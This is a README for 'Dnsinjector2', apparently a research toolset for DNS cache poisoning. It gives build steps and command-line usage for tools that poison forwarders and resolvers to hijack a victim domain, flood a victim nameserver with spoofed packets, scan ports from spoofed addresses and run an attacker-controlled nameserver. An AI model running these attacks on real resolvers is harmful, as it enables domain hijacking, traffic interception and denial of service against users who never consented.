# Dnsinjector2

(The following contents is translated from Chinese. Please contact [@wonderqs](https://github.com/wonderqs) or view the original Chinese version of README in previous commits.)

### Build

Dependencies:

- cmake
- make
- gcc / clang

````
./build.sh
````

or

````
mkdir build
cmake ..
make
````

### Usage

The following executables may be produced after building:

- attack_forwr (Forwarder attacking tool)
- attack_recur (Resolver attacking tool)
- attack_recur_ns (Resolver attacking tool, NS record polluting version)
- nsmuter (Attack tool for flooding the victim NS)
- udpscan (Private UDP port scanner)
- delayns（The program that sets up attacker-controlled NS.）

**Please run executables using root privileges because raw socket is used.**

#### attack_forwr

````
./attack_forwr -t <target_ip> -s <scan_src_ip> -u <upstream_ip> -o <tool_domain> -d <domain_poisoned> -a <poisoned_ip> [-v]
````

- -t:The IP of the victim forwarder;
- -s:The source IP for port scanning;
- -u:The upstream DNS resolver IP of the victim forwarder;
- -o:The attacker-controlled domain (used to piggyback the malicious CNAME response);
- -d:The victim domain;
- -a:The IP you want to hijack the victim domain to;
- -v:Verbose.


#### attack_recur

````
./attack_recur -i <recur_ip_in> -o <recur_ip_out> -s <scan_src_ip> -u <ns_server_ip>:<ns_server_ip> -d <domain_poisoned> -a <poisoned_ip> [-v]
````

- -i:The front-end IP of the victim resolver;
- -o:The back-end IP of the victim resolver;
- -s:The source IP for port scanning;
- -u:The IPs of the NSes of the victim domain. Split multiple IPs using ":";
- -d:The victim domain;
- -a:The IP you want to hijack the victim domain to;
- -v:verbose;

#### attack_recur_ns

````
./attack_recur -i <recur_ip_in> -o <recur_ip_out> -s <scan_src_ip> -u <ns_server_ip>:<ns_server_ip> -d <domain_poisoned> -n <poisoned_ns> [-v]
````

- -i:The front-end IP of the victim resolver;
- -o:The back-end IP of the victim resolver;
- -s:The source IP for port scanning;
- -u:The IPs of the NSes of the victim domain. Split multiple IPs using ":";
- -d:The victim domain;
- -n:The NS record of the upper-level domain of the victim domain after poisoning;
- -v:verbose;

#### nsmuter

````
./nsmuter -r <resolver_ip> -u <ns_server_ip> -d <domain_queried> [-s seconds] [-t threads]
````

- -r:The source IP of the flooding packets;
- -u:The destination IP of the flooding packets;
- -d:The DNS query name of the flooding packets;
- -s:Flooding time;
- -t:The number of threads to use;


#### udpscan

````
/udpscan -t <target_ip> -u <spoof_ip> [-s start_port] [-e end_port] [-l icmp_limit] [-v]
````

- -t:The destination IP of the scanning;
- -u:The source IP of the scanning packet;
- -s:Start port number;
- -e:End port number;
- -l:The ICMP global limit of the remote host;
- -v:Verbose;


#### delayns

````
./delayns -l <listen_addr> -z <domain_zone> -n <ns_domain>
````

- -l: Listening port number;
- -z: The domain hosted on this NS;
- -n: The domain name of this NS;
